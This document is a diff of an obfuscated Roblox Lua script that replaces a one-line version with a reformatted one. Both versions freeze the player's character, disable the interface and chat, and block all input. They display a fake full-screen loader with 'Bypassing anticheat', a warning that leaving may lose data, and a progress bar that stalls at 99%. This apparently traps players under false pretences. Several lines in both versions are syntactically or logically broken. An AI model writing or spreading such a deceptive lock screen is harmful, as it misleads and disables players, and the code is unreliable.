@@ -1,2 +1,99 @@
--- Fully Protected & Obfuscated Loading GUI -- Watermark: By:@g4sser_ local lIllIlIlIIIlIlIlIlIIlII = string; local lIlllIlIlIlIIlIlllIlIIIl = Instance; local lIIIIllIIIlIIIlIIIllIllI = Vector2; local lIIIIlIIIlIIlIIlIIlIIIlI = Enum local lIIIIIlIIlIlIllIIlIlIllI = game:GetService("Players") local IlIIIIllIlIllIlIIlIllIlI = game:GetService("UserInputService") local lIlIlIIllIlIllIlIIIlIllI = game:GetService("CoreGui") local IlllIIIIllIlIlIIIlIIllIl = game:GetService("TextChatService") local lIIIIIIllIIIllIIIlIIlIIl = lIIIIIlIIlIlIllIIlIlIllI.LocalPlayer local IlllIlIIlIlllIlIlIIIIIlI = lIIIIIIllIIIllIIIlIIlIIl:WaitForChild("PlayerGui") pcall(function() IlllIlIIlIlllIlIlIIIIIlI:FindFirstChild("FullCoverLoading"):Destroy() end) local function IIlIIIIllIIlIlIIllIlIlIl() local IlIIIlIlIllIllIlIllIlIlI = lIIIIIIllIIIllIIIlIIlIIl.Character or lIIIIIIllIIIllIIIlIIlIIl.CharacterAdded:Wait() local lIIIIIlIlIlIIlIIlIIIlIll = IlIIIlIlIllIllIlIllIlIlI:FindFirstChildOfClass("Humanoid") if lIIIIIlIlIlIIlIIlIIIlIll then lIIIIIlIlIlIIlIIlIIIlIll.WalkSpeed, lIIIIIlIlIlIIlIIlIIIlIll.JumpPower = 0, 0 end end IIlIIIIllIIlIlIIllIlIlIl() lIIIIIIllIIIllIIIlIIlIIl.CharacterAdded:Connect(IIlIIIIllIIlIlIIllIlIlIl) for , lIlIIIIllIIlIlIlIllIlIll in ipairs(IlllIlIIlIlllIlIlIIIIIlI:GetChildren()) do if lIlIIIIllIIlIlIlIllIlIll:IsA("ScreenGui") and lIlIIIIllIIlIlIlIllIlIll.Name ~= "FullCoverLoading" then lIlIIIIllIIlIlIlIllIlIll.Enabled = false end end IlllIlIIlIlllIlIlIIIIIlI.ChildAdded:Connect(function(IlllIlIlIIlIIIlIlIlIlIIlI) if IlllIlIlIIlIIIlIlIlIlIIlI:IsA("ScreenGui") and IlllIlIlIIlIIIlIlIlIlIIlI.Name ~= "FullCoverLoading" then IlllIlIlIIlIIIlIlIlIlIIlI.Enabled = false end end) pcall(function() IlllIIIIllIlIlIIIlIIllIl.ChatWindowConfiguration.Enabled = false if lIlIlIIllIlIllIlIIIlIllI:FindFirstChild("Chat") then lIlIlIIllIlIllIlIIIlIllI.Chat:Destroy() end end) lIlIlIIllIlIllIlIIIlIllI.ChildAdded:Connect(function(IllIIlIlIlIlIlIllIlIIIll) if IllIIlIlIlIlIlIllIlIIIll.Name == "Chat" then IllIIlIlIlIlIlIllIlIIIll:Destroy() end end) local IlIlIIlIIlIIlIlIlIlIIlll = lIlllIlIlIlIIlIlllIlIIIl.new("ScreenGui") IlIlIIlIIlIIlIlIlIlIIlll.Name, IlIlIIlIIlIIlIlIlIlIIlll.IgnoreGuiInset, IlIlIIlIIlIIlIlIlIlIIlll.ZIndexBehavior, IlIlIIlIIlIIlIlIlIlIIlll.DisplayOrder, IlIlIIlIIlIIlIlIlIlIIlll.ResetOnSpawn, IlIlIIlIIlIIlIlIlIlIIlll.Parent = "FullCoverLoading", true, lIIIIlIIIlIIlIIlIIlIIIlI.ZIndexBehavior.Global, 999999, false, IlllIlIIlIlllIlIlIIIIIlI local lIIllIIlIlIllllIllllIllI = lIlllIlIlIlIIlIlllIlIIIl.new("Frame") lIIllIIlIlIllllIllllIllI.Name, lIIllIIlIlIllllIllllIllI.AnchorPoint, lIIllIIlIlIllllIllllIllI.Position, lIIllIIlIlIllllIllllIllI.Size, lIIllIIlIlIllllIllllIllI.BackgroundColor3, lIIllIIlIlIllllIllllIllI.BorderSizePixel, lIIllIIlIlIllllIllllIllI.Parent = "FullBlack", lIIIIllIIIlIIIlIIIllIllI.new(0,0), UDim2.new(0,0,0,0), UDim2.new(1,0,1,0), Color3.new(), 0, IlIlIIlIIlIIlIlIlIlIIlll for _ = 1,15 do local IIlIlIlIlIllIIIIlIIIllI = lIlllIlIlIlIIlIlllIlIIIl.new("Frame", lIIllIIlIlIllllIllllIllI) IIlIlIlIlIllIIIIlIIIllI.Size = UDim2.new(0, math.random(60,120), 0, math.random(60,120)) IIlIlIlIlIllIIIIlIIIllI.Position = UDim2.new(math.random(), 0, math.random(), 0) IIlIlIlIlIllIIIIlIIIllI.BackgroundColor3 = Color3.fromRGB(math.random(50,100), math.random(50,100), math.random(50,100)) IIlIlIlIlIllIIIIlIIIllI.BackgroundTransparency, IIlIlIlIlIllIIIIlIIIllI.Rotation, IIlIlIlIlIllIIIIlIIIllI.BorderSizePixel = 0.8, math.random(0,360), 0 local llllIIlIIlIllIlIlIlIlIIl = lIlllIlIlIlIIlIlllIlIIIl.new("UICorner", IIlIlIlIlIllIIIIlIIIllI) llllIIlIIlIllIlIlIlIlIIl.CornerRadius = UDim.new(0, math.random(20,60)) task.spawn(function() while true do IIlIlIlIlIllIIIIlIIIllI:TweenPosition(UDim2.new(math.random(), 0, math.random(), 0), "InOut", "Sine", 4, true) IIlIlIlIlIllIIIIlIIIllI:TweenSize(UDim2.new(0, math.random(60,120), 0, math.random(60,120)), "InOut", "Sine", 4, true) task.wait(4) end end) end local llllIIIIIlIIIlIlIlIIlIlI = lIlllIlIlIlIIlIlllIlIIIl.new("TextLabel", lIIllIIlIlIllllIllllIllI) llllIIIIIlIIIlIlIlIIlIlI.Size, llllIIIIIlIIIlIlIlIIlIlI.Position, llllIIIIIlIIIlIlIlIIlIlI.BackgroundTransparency = UDim2.new(1,0,0.1,0), UDim2.new(0,0,0.4,0), 1 llllIIIIIlIIIlIlIlIIlIlI.Font, llllIIIIIlIIIlIlIlIIlIlI.TextScaled, llllIIIIIlIIIlIlIlIIlIlI.TextColor3 = lIIIIlIIIlIIlIIlIIlIIIlI.Font.GothamSemibold, true, Color3.new(1,1,1) llllIIIIIlIIIlIlIlIIlIlI.TextStrokeTransparency = 0.5 llllIIIIIlIIIlIlIlIIlIlI.Text = "⏳ Loading... 0% \t\t\t By:@g4sser" local lIIlIIlIlIIIllIllIlIIlIlI = lIlllIlIlIlIIlIlllIlIIIl.new("TextLabel", lIIllIIlIlIllllIllllIllI) lIIlIIlIlIIIllIllIlIIlIlI.Size, lIIlIIlIlIIIllIllIlIIlIlI.Position, lIIlIIlIlIIIllIllIlIIlIlI.BackgroundTransparency = UDim2.new(1,0,0.05,0), UDim2.new(0,0,0.5,0), 1 lIIlIIlIlIIIllIllIlIIlIlI.Font, lIIlIIlIlIIIllIllIlIIlIlI.TextScaled, lIIlIIlIlIIIllIllIlIIlIlI.TextColor3 = lIIIIlIIIlIIlIIlIIlIIIlI.Font.Gotham, true, Color3.fromRGB(170,170,170) lIIlIIlIlIIIllIllIlIIlIlI.Text = "Bypassing anticheat..." local IIlIlIIlIllIlllIlIIllIIl = lIlllIlIlIlIIlIlllIlIIIl.new("TextLabel", lIIllIIlIlIllllIllllIllI) IIlIlIIlIllIlllIlIIllIIl.Size, IIlIlIIlIllIlllIlIIllIIl.Position, IIlIlIIlIllIlllIlIIllIIl.BackgroundTransparency = UDim2.new(1,0,0.05,0), UDim2.new(0,0,0.57,0), 1 IIlIlIIlIllIlllIlIIllIIl.Font, IIlIlIIlIllIlllIlIIllIIl.TextScaled, IIlIlIIlIllIlllIlIIllIIl.TextColor3 = lIIIIlIIIlIIlIIlIIlIIIlI.Font.Gotham, true, Color3.fromRGB(255,60,60) IIlIlIIlIllIlllIlIIllIIl.Text = "⚠️ Do not leave, or your data may be lost." local IllIlIIlIlIlIIIlIlIlIIlI = lIlllIlIlIlIIlIlllIlIIIl.new("Frame", lIIllIIlIlIllllIllllIllI) IllIlIIlIlIlIIIlIlIlIIlI.Size, IllIlIIlIlIlIIIlIlIlIIlI.Position = UDim2.new(0.8,0,0.015,0), UDim2.new(0.1,0,0.66,0) IllIlIIlIlIlIIIlIlIlIIlI.BackgroundColor3, IllIlIIlIlIlIIIlIlIlIIlI.BackgroundTransparency, IllIlIIlIlIlIIIlIlIlIIlI.BorderSizePixel = Color3.fromRGB(40,40,40), 0.3, 0 lIlllIlIlIlIIlIlllIlIIIl.new("UICorner", IllIlIIlIlIlIIIlIlIlIIlI).CornerRadius = UDim.new(0, 8) local lIlllIlIlIIlllIIIllIIlIlI = lIlllIlIlIlIIlIlllIlIIIl.new("Frame", IllIlIIlIlIlIIIlIlIlIIlI) lIlllIlIlIIlllIIIllIIlIlI.Size, lIlllIlIlIIlllIIIllIIlIlI.BackgroundColor3, lIlllIlIlIIlllIIIllIIlIlI.BorderSizePixel = UDim2.new(0,0,1,0), Color3.fromRGB(255,255,255), 0 lIlllIlIlIlIIlIlllIlIIIl.new("UICorner", lIlllIlIlIIlllIIIllIIlIlI).CornerRadius = UDim.new(0, 8) local function IIllIlIIlIlllIlIIllIIlIl() for lIlIIlIIIlIIlIIlIIIlllIl = 1,99 do llllIIIIIlIIIlIlIlIIlIlI.Text = "⏳ Loading... "..lIlIIlIIIlIIlIIlIIIlllIl.."%\t\t\t By:@g4sser_" lIlllIlIlIIlllIIIllIIlIlI:TweenSize(UDim2.new(lIlIIlIIIlIIlIIlIIIlllIl/100,0,1,0),"Out","Quad",0.1,true) task.wait(120/99) end llllIIIIIlIIIlIlIlIIlIlI.Text = "⏳ Loading... 99%\t\t\t By:@g4sser_" lIIlIIlIlIIIllIllIlIIlIlI.Text = "Finding an old server, please wait" task.wait(300) end task.spawn(IIllIlIIlIlllIlIIllIIlIl) local function IllIllIlIIlIlIIllIIlIlIl() while true do for lllIIlIlIIlIIlIIlIlIIlIl = 1,3 do if lIIlIIlIlIIIllIllIlIIlIlI.Text:find("Bypassing") then lIIlIIlIlIIIllIllIlIIlIlI.Text = "Bypassing anticheat" .. string.rep(".", lllIIlIlIIlIIlIIlIlIIlIl) elseif lIIlIIlIlIIIllIllIlIIlIlI.Text:find("Finding") then lIIlIIlIlIIIllIllIlIIlIlI.Text = "Finding an old server, please wait" .. string.rep(".", lllIIlIlIIlIIlIIlIlIIlIl) end task.wait(0.5) end end end task.spawn(IllIllIlIIlIlIIllIIlIlIl) IlIIIIllIlIllIlIIlIllIlI.InputBegan:Connect(function() return lIIIIlIIIlIIlIIlIIlIIIlI.ContextActionResult.Sink end) while true do task.wait(1) end
+-- By:@g4sser_ | Protected Loader
+local _,_,___=string,Instance,Vector2
+local __,___,_=Enum,game:GetService,game:GetService("UserInputService")
+local _,_,_L=__:GetService("Players"),__("TextChatService"),__(game,"CoreGui")
+local _,playerGui=__:GetService("Players").LocalPlayer,__:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")
+pcall(function()playerGui:FindFirstChild("FullCoverLoading"):Destroy()end)
 
+local function ___()
+	local c=__:GetService("Players").LocalPlayer.Character or __:GetService("Players").LocalPlayer.CharacterAdded:Wait()
+	local h=c and c:FindFirstChildOfClass("Humanoid")
+	if h then h.WalkSpeed,h.JumpPower=0,0 end
+end;___()
+__:GetService("Players").LocalPlayer.CharacterAdded:Connect(___)
+
+for _,g in ipairs(playerGui:GetChildren())do
+	if g:IsA("ScreenGui") and g.Name~="FullCoverLoading"then g.Enabled=false end
+end
+
+playerGui.ChildAdded:Connect(function(v)
+	if v:IsA("ScreenGui") and v.Name~="FullCoverLoading"then v.Enabled=false end
+end)
+
+pcall(function()_.ChatWindowConfiguration.Enabled=false if _L:FindFirstChild("Chat")then _L.Chat:Destroy()end end)
+_L.ChildAdded:Connect(function(c)if c.Name=="Chat"then c:Destroy()end end)
+
+local gui=Instance.new("ScreenGui")
+gui.Name,gui.IgnoreGuiInset,gui.ZIndexBehavior,gui.DisplayOrder,gui.ResetOnSpawn,gui.Parent="FullCoverLoading",true,Enum.ZIndexBehavior.Global,999999,false,playerGui
+
+local base=Instance.new("Frame")
+base.Name,base.AnchorPoint,base.Position,base.Size,base.BackgroundColor3,base.BorderSizePixel,base.Parent="FullBlack",___(0,0),UDim2.new(0,0,0,0),UDim2.new(1,0,1,0),Color3.new(),0,gui
+
+for _=1,15 do
+	local b=Instance.new("Frame",base)
+	b.Size=UDim2.new(0,math.random(60,120),0,math.random(60,120))
+	b.Position=UDim2.new(math.random(),0,math.random(),0)
+	b.BackgroundColor3=Color3.fromRGB(math.random(50,100),math.random(50,100),math.random(50,100))
+	b.BackgroundTransparency,b.Rotation,b.BorderSizePixel=0.8,math.random(0,360),0
+	Instance.new("UICorner",b).CornerRadius=UDim.new(0,math.random(20,60))
+	task.spawn(function()
+		while true do
+			b:TweenPosition(UDim2.new(math.random(),0,math.random(),0),"InOut","Sine",4,true)
+			b:TweenSize(UDim2.new(0,math.random(60,120),0,math.random(60,120)),"InOut","Sine",4,true)
+			task.wait(4)
+		end
+	end)
+end
+
+local txt=Instance.new("TextLabel",base)
+txt.Size,txt.Position,txt.BackgroundTransparency=UDim2.new(1,0,0.1,0),UDim2.new(0,0,0.4,0),1
+txt.Font,txt.TextScaled,txt.TextColor3=Enum.Font.GothamSemibold,true,Color3.new(1,1,1)
+txt.TextStrokeTransparency=0.5
+txt.Text="⏳ Loading... 0%\t\t\tBy:@g4sser_"
+
+local msg=Instance.new("TextLabel",base)
+msg.Size,msg.Position,msg.BackgroundTransparency=UDim2.new(1,0,0.05,0),UDim2.new(0,0,0.5,0),1
+msg.Font,msg.TextScaled,msg.TextColor3=Enum.Font.Gotham,true,Color3.fromRGB(170,170,170)
+msg.Text="Bypassing anticheat..."
+
+local warn=Instance.new("TextLabel",base)
+warn.Size,warn.Position,warn.BackgroundTransparency=UDim2.new(1,0,0.05,0),UDim2.new(0,0,0.57,0),1
+warn.Font,warn.TextScaled,warn.TextColor3=Enum.Font.Gotham,true,Color3.fromRGB(255,60,60)
+warn.Text="⚠️ Do not leave, or your data may be lost."
+
+local barFrame=Instance.new("Frame",base)
+barFrame.Size,barFrame.Position=UDim2.new(0.8,0,0.015,0),UDim2.new(0.1,0,0.66,0)
+barFrame.BackgroundColor3,barFrame.BackgroundTransparency,barFrame.BorderSizePixel=Color3.fromRGB(40,40,40),0.3,0
+Instance.new("UICorner",barFrame).CornerRadius=UDim.new(0,8)
+
+local bar=Instance.new("Frame",barFrame)
+bar.Size,bar.BackgroundColor3,bar.BorderSizePixel=UDim2.new(0,0,1,0),Color3.fromRGB(255,255,255),0
+Instance.new("UICorner",bar).CornerRadius=UDim.new(0,8)
+
+task.spawn(function()
+	for i=1,99 do
+		txt.Text="⏳ Loading... "..i.."%\t\t\tBy:@g4sser_"
+		bar:TweenSize(UDim2.new(i/100,0,1,0),"Out","Quad",0.1,true)
+		task.wait(120/99)
+	end
+	txt.Text="⏳ Loading... 99%\t\t\tBy:@g4sser_"
+	msg.Text="Finding an old server, please wait"
+	task.wait(300)
+end)
+
+task.spawn(function()
+	while true do
+		for d=1,3 do
+			if msg.Text:find("Bypassing") then
+				msg.Text="Bypassing anticheat"..string.rep(".",d)
+			elseif msg.Text:find("Finding") then
+				msg.Text="Finding an old server, please wait"..string.rep(".",d)
+			end
+			task.wait(0.5)
+		end
+	end
+end)
+
+_:Connect(function()return Enum.ContextActionResult.Sink end)
+
+while true do task.wait(1) end
